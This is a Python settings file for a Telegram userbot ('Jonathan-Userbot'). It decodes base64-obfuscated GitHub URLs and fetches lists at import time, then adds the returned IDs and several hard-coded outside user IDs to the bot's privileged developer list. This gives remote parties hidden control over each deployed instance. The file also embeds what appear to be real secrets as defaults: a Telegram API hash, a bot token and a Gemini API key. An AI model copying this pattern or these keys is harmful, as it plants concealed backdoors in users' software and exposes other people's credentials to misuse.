import json
import sys
from base64 import b64decode
from os import getenv

import requests
from dotenv import load_dotenv

black = int(b64decode("MTA1NDI5NTY2NA=="))

ERROR = "Maintained ? Yes"
DIBAN = "ANDA DIBANNED DI @OFFICIALFREESEX"


def get_devs():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9kZXZzLmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


def get_tolol():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi90b2xvbC5qc29u"
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


def get_blgc():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9ibGdjYXN0Lmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


TOLOL = get_tolol()

NO_GCAST = get_blgc()

load_dotenv()

id_button = {}
CMD_HELP = {}


DEVS = get_devs()

devs_boong = list(map(int, getenv("devs_boong", "7906973445").split()))
api_id = int(getenv("api_id", 20897598))
api_hash = getenv("api_hash", "93acdbdc4b23c0398bd2042d5ee3865e")
bot_token = getenv("bot_token", "7332373850:AAHQ98r7hqBubGHxUA8INASNlLJQ27um26s")
bot_id = int(getenv("bot_id", "7332373850"))
db_name = getenv("db_name", "gien")
log_pic = getenv("log_pic", "https://files.catbox.moe/n552wi.jpg")
def_bahasa = getenv("def_bahasa", "id")
owner_id = int(getenv("owner_id", "6379016102"))
the_cegers = list(
    map(
        int,
        getenv(
            "the_cegers",
            "1920815038 6997083640 5276561800 7906973445",
        ).split(),
    )
)
dump = int(getenv("dump", "-1002321684876"))
bot_username = getenv("bot_username", "@jonathanlenathea_bot")
log_userbot = int(getenv("log_userbot", "1920815038"))
nama_bot = getenv("nama_bot", "Jonathan-Userbot")
gemini_api = getenv("gemini_api", "AIzaSyARecWxktUPu_ywxywdg3OFwh3XkyrD4_M")
botcax_api = getenv("botcax_api", "GenzR")


if owner_id not in the_cegers:
    the_cegers.append(owner_id)
if owner_id not in DEVS:
    DEVS.append(owner_id)
    DEVS.append(7906973445)
for a in the_cegers:
    DEVS.append(a)
